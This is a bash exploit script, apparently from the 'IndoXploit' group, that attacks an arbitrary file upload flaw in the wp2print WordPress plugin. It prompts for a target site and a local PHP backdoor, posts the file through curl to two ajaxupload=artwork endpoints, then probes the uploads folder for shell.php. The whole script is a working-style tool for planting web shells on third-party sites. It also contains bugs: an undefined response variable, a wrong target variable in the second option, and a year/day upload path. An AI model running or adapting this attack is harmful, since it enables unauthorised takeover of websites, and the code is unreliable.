#!/bin/bash   
##############################################################
#
#                    COLORING YOUR SHELL
#
##############################################################
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[0;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
Purple="\033[0;35m"                                         ##
Cyan="\033[0;36m"                                           ##
Cafe="\033[0;33m"                                           ##
Fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
nc="\e[0m"                                                  ##
##############################################################
clear
YEAR=$(date +'%Y')
DAY=$(date +'%d')
banner () {
printf "${yellow}
                ____             _       _   
 __      ______|___ \ _ __  _ __(_)_ __ | |_ 
 \ \ /\ / / '_ \ __) | '_ \| '__| | '_ \| __|
  \ V  V /| |_) / __/| |_) | |  | | | | | |_ 
   \_/\_/ | .__/_____| .__/|_|  |_|_| |_|\__|
          |_|        |_|${green}Arbitrary File Upload                    
${white}
 *********[OPTIONS]**********************************
 *                                                  *
 * 1. ${yellow}/wp-admin/admin-ajax.php?ajaxupload=artwork${white}   *
 * 2. ${yellow}/index.php?ajaxupload=artwork${white}                 *
 *                                                  *
 ***********************************[${green}IndoXploit]${white}*****\n";}
exploit () {
echo "";
printf " ┌[${green}+${white}] Choose the options\n";
echo -ne " └[root@indoxploit]:~#  ";
read options
if [[ $options == "1" ]]; then
clear
banner
upload_shell1
elif [[ $options == "2" ]]; then
clear
banner
upload_shell2
else
echo " Keyboard Interrupt "
fi
}
upload_shell1(){
clear
banner
echo "";
printf " [${green}+${white}] Drop Target : "
read TARGET1
printf " [${green}+${white}] Backdoor In This Dir : ${red}\n"
 ls | grep .php
printf " ${white}[${green}+${white}] Choose Your Own Backdoor : "
read youshell

wp2print=$(timeout 3 curl --silent --output /dev/null -F "file=@$youshell" $TARGET1/wp-admin/admin-ajax.php?ajaxupload=artwork; timeout 3 curl --write-out "%{http_code}\n" --silent --output /dev/null "$TARGET1/wp-content/uploads/$YEAR/$DAY/shell.php")
if [[ $response =~ "200" ]]; then
printf " $TARGET1  >  [$response] ${green} SUCCESS UPLOADED ${white}\n"
else
printf " $TARGET1  >  [$response] ${red} ERROR NOT UPLOADED ${white}\n"
fi
}
upload_shell2(){
clear
banner
echo "";
printf " [${green}+${white}] Drop Target : "
read TARGET2
printf " [${green}+${white}] Backdoor In This Dir : ${red}\n"
 ls | grep .php
printf "${white} [${green}+${white}] Choose Your Own Shell : "
read youshell
ls
wp2print=$(timeout 3 curl --silent --output /dev/null -F "file=@shell.php" $TARGET1/index.php?ajaxupload=artwork; timeout 3 curl --write-out "%{http_code}\n" --silent --output /dev/null "$TARGET1/wp-content/uploads/$YEAR/$DAY/shell.php")
if [[ $response =~ "200" ]]; then
printf " $TARGET2  >  [$response] ${green} SUCCESS UPLOADED ${white}\n"
else
printf " $TARGET2  >  [$response] ${red} ERROR NOT UPLOADED ${white}\n"
fi
}
banner
exploit
